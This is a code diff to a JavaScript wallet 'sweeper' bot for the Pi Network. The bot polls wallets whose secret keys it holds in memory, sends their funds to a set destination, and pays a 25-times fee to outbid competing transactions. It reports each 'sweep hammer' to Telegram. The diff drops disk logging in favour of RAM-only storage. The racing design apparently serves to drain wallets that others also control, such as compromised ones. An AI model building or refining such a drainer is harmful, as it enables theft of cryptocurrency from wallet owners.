@@ -1,7 +1,5 @@
 'use strict';
 
-const fs = require('fs');
-const path = require('path');
 const StellarSdk = require('@stellar/stellar-sdk');
 
 const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com';
@@ -9,14 +7,14 @@ const NETWORK_PASSPHRASE = process.env.STELLAR_NETWORK_PASSPHRASE || 'Pi Network
 const DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
 const POLL_INTERVAL_MS = Math.max(10, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
 const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);
-const DATA_DIR = process.env.DATA_DIR || '/data';
 
 const server = new StellarSdk.Horizon.Server(HORIZON_URL);
 let monitorRunning = false;
 let monitorTimeoutId = null;
 
-// IN-MEMORY STORAGE (RAM) - Keys are never saved to disk
+// IN-MEMORY STORAGE (RAM) - Zero disk/native module dependencies
 const liveWalletsMap = new Map();
+const transactionHistory = [];
 
 function getErrorDetails(error) {
   if (error?.response?.data?.extras?.result_codes) {
@@ -31,25 +29,13 @@ function log(level, message, details) {
 }
 
 function initDatabase() {
-  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-  const Database = require('better-sqlite3');
-  const db = new Database(path.join(DATA_DIR, 'sweeper.db'));
-  db.pragma('journal_mode = WAL');
-  
-  db.exec(`
-    CREATE TABLE IF NOT EXISTS sweeper_transactions (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      wallet_id TEXT NOT NULL,
-      source_address TEXT NOT NULL,
-      destination_address TEXT NOT NULL,
-      amount TEXT NOT NULL,
-      transaction_hash TEXT,
-      status TEXT NOT NULL,
-      error_details TEXT,
-      created_at TEXT NOT NULL
-    );
-  `);
-  return db;
+  log('INFO', 'Pure in-memory RAM transaction registry initialized successfully.');
+  return {
+    logTransaction(record) {
+      transactionHistory.push(record);
+      if (transactionHistory.length > 500) transactionHistory.shift();
+    }
+  };
 }
 
 const WalletManager = {
@@ -132,7 +118,6 @@ const SweeperEngine = {
 
       let targetAmount = 0;
 
-      // Dual-Mode: Custom Amount vs Default Tiered Logic
       if (wallet.customAmount && wallet.customAmount > 0) {
         if (evalResult.spendable >= wallet.customAmount) {
           targetAmount = wallet.customAmount;
@@ -140,7 +125,6 @@ const SweeperEngine = {
           return { status: 'BELOW_FIXED_TARGET' };
         }
       } else {
-        // Tiered Auto-Strategy: > 1 Pi leaves 1 Pi; between 0.02 and 1 Pi leaves 0.02 Pi
         if (evalResult.spendable > 1.0) {
           targetAmount = evalResult.spendable - 1.0;
         } else if (evalResult.spendable > 0.02) {
@@ -163,7 +147,7 @@ const SweeperEngine = {
       try {
         const freshAccount = await server.loadAccount(pubKey);
         const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
-          fee: String(baseFee * 25), // Maximum fee multiplier to outbid competitors instantly
+          fee: String(baseFee * 25),
           networkPassphrase: NETWORK_PASSPHRASE
         })
         .addOperation(StellarSdk.Operation.payment({
@@ -184,11 +168,11 @@ const SweeperEngine = {
 
       const now = new Date().toISOString();
       if (success) {
-        db.prepare(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, transaction_hash, status, created_at) VALUES (?, ?, ?, ?, ?, 'SUCCESS', ?)`).run(id, pubKey, targetDestination, String(sweptAmount), txHash, now);
+        db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: targetDestination, amount: String(sweptAmount), transaction_hash: txHash, status: 'SUCCESS', created_at: now });
         await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP HAMMER SUCCESS!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Buffer: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
         return { status: 'SUCCESS' };
       } else {
-        db.prepare(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, status, error_details, created_at) VALUES (?, ?, ?, '0', 'FAILED', ?, ?)`).run(id, pubKey, targetDestination, errorReason, now);
+        db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: targetDestination, amount: '0', status: 'FAILED', error_details: errorReason, created_at: now });
         log('WARN', `Hammer attempt blocked/failed on Box #${id}: ${errorReason}. Retrying next cycle...`);
         return { status: 'FAILED' };
       }
